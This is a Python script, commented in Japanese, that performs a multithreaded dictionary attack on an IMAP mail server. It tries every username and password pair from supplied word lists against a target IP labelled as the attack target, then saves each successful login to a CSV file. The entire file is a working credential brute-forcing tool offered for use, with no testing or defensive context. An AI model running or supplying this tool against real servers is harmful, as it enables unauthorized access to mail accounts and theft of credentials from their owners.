import argparse
import socket
import concurrent.futures
from tqdm import tqdm
import csv
import os
import imaplib

# 辞書を読み込む関数
def load_dictionary(username_path, password_path, attack_ip):
    # ユーザ名とパスワードのリストを読み込む
    with open(username_path, 'r') as user_file:
        usernames = user_file.read().splitlines()
    with open(password_path, 'r') as pass_file:
        passwords = pass_file.read().splitlines()
    
    # 総タスク数を計算
    total_tasks = len(usernames) * len(passwords)
    print(f"Total tasks: {total_tasks}")

    # プログレスバーを初期化
    with tqdm(total=total_tasks) as progress_bar:
        # スレッドプールを作成
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = []
            # 各ユーザ名に対して全てのパスワードを試行
            for username in usernames:
                for password in passwords:
                    futures.append(executor.submit(handle_login_attempt, username, password, attack_ip, progress_bar))
            
            # 全てのスレッドが完了するのを待つ
            concurrent.futures.wait(futures)



# ログイン可能かを判断する関数
def check_login(ip_address: str, user_id: str, password: str) -> list:
    result = []  # 結果を格納するリスト
    try:
        # IMAPポート143を使用して接続を試みる
        mail = imaplib.IMAP4(ip_address)
        # ログインを試みる
        mail.login(user_id, password)
        # ログイン成功
        mail.logout()
        result = ['Yes', ip_address, user_id, password]  
    except imaplib.IMAP4.error:
        # ログイン失敗
        result = ['No']
    return result



# ログイン試行を行う関数
def handle_login_attempt(username, password, attack_ip, progress_bar):
    # ログインを試行
    result = check_login(attack_ip, username, password)
    
    # 結果に基づいてCSVに書き込む
    write_to_csv(result, "login_report.csv")
    
    # プログレスバーを進める
    progress_bar.update(1)

# CSVファイルにログイン結果を書き込む関数
def write_to_csv(result: list, filename: str):
    # ヘッダー行
    header = ['ip_address', 'user_id', 'password']
    
    # CSVファイルが既に存在するかどうかを確認
    file_exists = os.path.isfile(filename)
    
    # 最初の要素が'Yes'の場合
    if result[0] == 'Yes':
        with open(filename, mode='a', newline='') as file:
            writer = csv.writer(file)
            
            # ファイルが存在しない場合はヘッダーを書き込む
            if not file_exists:
                writer.writerow(header)
            
            # ログイン結果を書き込み(result[1:] で ip_address, user_id, password 部分だけ取得)
            writer.writerow(result[1:])
        
        print(f"ログイン成功データが {filename} に保存されました。")
    else:
        pass
                    

# メイン関数
def main():
    parser = argparse.ArgumentParser(description="Login attempt script")
    
    # コマンドライン引数の追加
    parser.add_argument('--attack_ip', required=True, help="攻撃先のIPアドレス")
    parser.add_argument('--username_path', required=True, help="ユーザ名ファイルのパス")
    parser.add_argument('--password_path', required=True, help="パスワードファイルのパス")

    # 引数の解析
    args = parser.parse_args()

    # 辞書攻撃の実行
    load_dictionary(args.username_path, args.password_path, args.attack_ip)



if __name__ == "__main__":
    main()






